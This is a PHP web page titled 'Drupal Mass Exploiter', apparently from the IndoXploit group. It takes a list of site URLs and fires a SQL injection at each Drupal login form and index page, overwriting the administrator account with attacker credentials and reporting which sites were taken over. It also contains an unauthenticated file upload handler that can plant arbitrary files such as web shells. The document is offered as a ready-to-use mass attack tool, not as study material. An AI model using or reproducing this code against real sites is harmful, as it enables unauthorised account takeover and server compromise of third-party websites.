 <!Doctype HTML>
<html>
<head>
    <title>Drupal Exploit</title>
    <link href="https://fonts.googleapis.com/css?family=Metal Mania|Ceviche+One|Nosifer|Iceberg|Rancho|Iceland|Nova+Mono|Libre+Barcode+39+Extended+Text" rel="stylesheet" type="text/css"> 
    <style type="text/css">
    .mymargin{
        margin-top:30px;
        font-family: monospace;
    }
    body, html {
        background-color:black;
        text-align: center;
        color: #008000;
        margin: 10px auto;
    }
    a {
    color: white;
    text-decoration: none;
}
li {
          color: white;
          text-decoration: none;
          font-size: 40px;
          font-family: iceberg;
          }
    </style>
</head>
<body>
<center>
	    	 <font color="white" face="iceberg" size="40">DRUPAL MASS EXPLOITER</font><br>
    <div class="mymargin">
        <center>
        	
            <form method="POST" action="">
        <textarea name="url" placeholder="Example: www.site.com" style="resize: none; border: 2px solid red; color: #bb0000; background: transparent; margin: 5px auto; padding-left: 5px; width: 500px; height: 250px;"></textarea><br>
        <input style="border: 2px solid red; color: white; background: transparent; margin: 5px; width: 350px; height: 25px;" size="50" type="submit" name="submit" value="Attack">
    </form>
    <br>
<?php
/* Tools ini Dibuat oleh Mr. Error 404 | IndoXploit - Sanjungan Jiwa
Segala bentuk copy paste harap tidak mengubah copyright asli - hak cipta 2015 IndoXploit - Sanjungan Jiwa
Hargailah karya sang pencipta ^_^
Salam hangat IndoXploit Coders Team
Karya Asli anak Bangsa !!!
*/
error_reporting(0);
$submit = $_POST['submit'];
$url = explode("\r\n", $_POST['url']);
if($submit) {
    foreach($url as $sites) {
    $log = "/user/login";
    $holako = "/?q=user";
    $post_data = "name[0;update users set name %3D 'sjteam' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($sites . '/user/login/', null, $ctx);
    echo "<u>Testing user/login</u><br>";
    if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
        echo "Scanning: <font color=white>$sites</font><br>";
        echo "Status: Successfully Xploited!<br>";
        echo "Data=> user: <font color='#ff3'>sjteam</font> | pass: <font color='#ff3'>admin</font><br>";
        echo "Login: <a href='$sites$log' target='_blank' style='text-decoration: none'>$sites$log</a><br><br>";
    } else {
        echo "Scanning: <font color=white>$sites</font><br>";
        echo "Status: <font color=red>Not Xploited!</font><br><br>";
    }
}
}
if($submit) {
    foreach($url as $sites) {
    $post_data = "name[0;update users set name %3D 'sjteam' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($sites . '?q=node&destination=node', null, $ctx);
    echo '<u>Testing at Index</u><br>';
    if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
        echo "Scanning: <font color=white>$sites</font><br>";
        echo "Status: Successfully Xploited!<br>";
        echo "Data => user: <font color='#ff3'>sjteam</font> | pass: <font color='#ff3'>admin</font><br>";
        echo "Login: <a href='$sites$log' target='_blank' style='text-decoration: none'>$sites$log</a><br><br>";
    } else {
        echo "Scanning: <font color=white>$sites</font><br>";
        echo "Status: <font color=red>Not Xploited!</font><br><br>";
    }
}
}
?>
    </div>
<?php
 
$Drupal  = $_POST['Drupal'];
 
 
if($Drupal == 'Drupal') {
 
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
 
echo "<form method='POST' enctype='multipart/form-data'>
  <input type='file'name='file' />
  <input type='submit' value='go' />
 
</form>";
move_uploaded_file($filetmp,$filename);
}
?>
	<br><br><br><br><br><br><br>
		</font> <font size="3>" font color="#CECECE" face="Georgia">Copyright</font> <font size="2"><script>document.write(new Date().getFullYear())</script> </font><font size="3>" font color="#CECECE" face="Georgia">All rights reserved. codexrush</font></font>
<br><br><br>
<a href="http://tools.codexrush.com"><font color=white> <-- Return to previous page</a></font></center>
</body>
</html>